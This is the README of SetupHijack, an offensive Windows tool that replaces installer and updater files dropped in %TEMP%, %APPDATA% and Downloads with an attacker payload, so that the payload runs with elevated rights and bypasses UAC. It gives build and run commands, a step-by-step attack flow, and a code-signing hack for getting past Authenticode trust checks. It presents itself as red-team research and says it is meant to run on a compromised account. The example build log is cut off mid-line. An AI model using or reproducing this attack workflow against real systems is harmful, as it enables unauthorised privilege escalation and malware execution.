# SetupHijack

---

## Overview

**SetupHijack** is a security research tool that exploits race conditions and insecure file handling in Windows installer and update processes. It targets scenarios where privileged installers or updaters drop files in `%TEMP%` or other world-writable locations, allowing an attacker to replace these files before they are executed with elevated privileges.

- Does **not** require elevated permissions to run.
- Does **not** use file system notifications (polls for changes instead).
- Exploits weaknesses in Authenticode code signing and installer trust models.
- Can infect `.exe`, `.msi`, and batch files (e.g., `sysinfo`, `netstat`, `ipconfig`).
- Designed for red team, penetration testing, and security research use only.

The intended use of this tool is to run in the background on a compromised user account with privileges, in order to elevate another process by hijacking installer/updater file drops. 

The chart below shows real-world example use cases of this exploit in multiple scenarios that can be used for UAC bypass. UAC bypasses are considered a security boundary when running under Adminless and are a common "attacker requirement" for disabling security controls. Exploitation of privileged Administrator operations provides generic exploit accessibility for malicious code to side-load or escalate process privileges. This tool can be used to identify additional applications which are exposed to the same types of risk, an attacker can wait for execution of these processes as a means to gain elevated rights without disrupting user behaviors. 

![SetupHijack Vulnerability Discovery Chart](Chart.png)

## How It Works

1. **SetupHijack** continuously scans `%TEMP%` (and subdirectories) for new or modified installer files.
2. When a target file is detected, it is replaced with a user-supplied payload (EXE, MSI, or BAT), optionally preserving the original as a `.bak` file.
3. If the privileged process executes the replaced file before integrity checks, the payload runs with elevated rights (e.g., SYSTEM or Administrator).
4. The tool logs all actions and maintains a skiplist to avoid re-infecting the same files.

## Code Signing Note

This project uses a hacked code-signing process with [SignToolEx.exe and SignToolExHook.dll](https://github.com/hackerhouse-opensource/SignToolEx) to sign payloads and installers. Using valid code-signing certificates and an Authenticode timestamp will increase your success rate when bypassing installer and OS trust checks.

---

## Usage

### Build

```sh
nmake PAYLOAD=c:\Path\to\your\payload.exe
```

### Run (Options)

```sh
SetupHijack.exe                  # Scan %TEMP%, %APPDATA%, and %USERPROFILE%\Downloads (default)
SetupHijack.exe -notemp          # Disable scanning %TEMP%
SetupHijack.exe -noappdata       # Disable scanning %APPDATA%
SetupHijack.exe -nodownloads     # Disable scanning %USERPROFILE%\Downloads
SetupHijack.exe clean            # Clean mode (restores .bak backups in all enabled locations)
SetupHijack.exe verbose          # Verbose mode (log all actions)
SetupHijack.exe <payload.exe>    # Use specified payload for .exe (unless argument is a recognized option)
```

- Run **SetupHijack.exe** before or during a privileged install/update process.
- By default, the tool scans all common drop locations: %TEMP%, %APPDATA%, and %USERPROFILE%\Downloads.
- You can disable any location with the `-notemp`, `-noappdata`, or `-nodownloads` flags.
- The `clean` flag restores backups in all enabled locations. The `verbose` flag logs all actions.
- For remote escalation, use with `shadow.exe` or similar tools on Terminal Services.

## Example Attack Flow

1. Build your payload and SetupHijack:
   ```sh
   nmake PAYLOAD=c:\Users\YourUser\Desktop\payload.exe
   ```
2. Start SetupHijack:
   ```sh
   SetupHijack.exe
   ```
3. Launch the target installer or update process as Administrator.
4. If the installer drops files in `%TEMP%` and executes them with elevated rights, your payload will be substituted and run.

## Example Output

Below is a real example of building and running SetupHijack, including code signing and infection output:

```
C:\Users\Fantastic\Desktop\Sayuri\InfectElevatedSetups>nmake PAYLOAD="C:\USers\Fantastic\Desktop\DEMO\Renge_x64.exe"

Microsoft (R) Program Maintenance Utility Version 14.29.30159.0
Copyright (C) Microsoft Corporation.  All rights reserved.

        powershell -Command "(Get-Content SetupHijack.cpp) -replace '#define PAYLOAD_PATH L\".*\"', '#define PAYLOAD_PATH L\"%ESCAPED_PAYLOAD%\"' | Set-Content SetupHijack.cpp"
        cl /nologo /W4 /EHsc /DUNICODE /D_UNICODE /MT /O2 /c SetupHijack.cpp
SetupHijack.cpp
SetupHijack.cpp(318): warning C4189: 'hr2': local variable is initialized but not referenced
        taskkill /f /im SetupHijack.exe 2>nul
        powershell -Command "Start-Sleep -Milliseconds 500"
        link /nologo /SUBSYSTEM:CONSOLE /ENTRY:wmainCRTStartup /NODEFAULTLIB:MSVCRT /NODEFAULTLIB:MSVCPRT /OUT:Se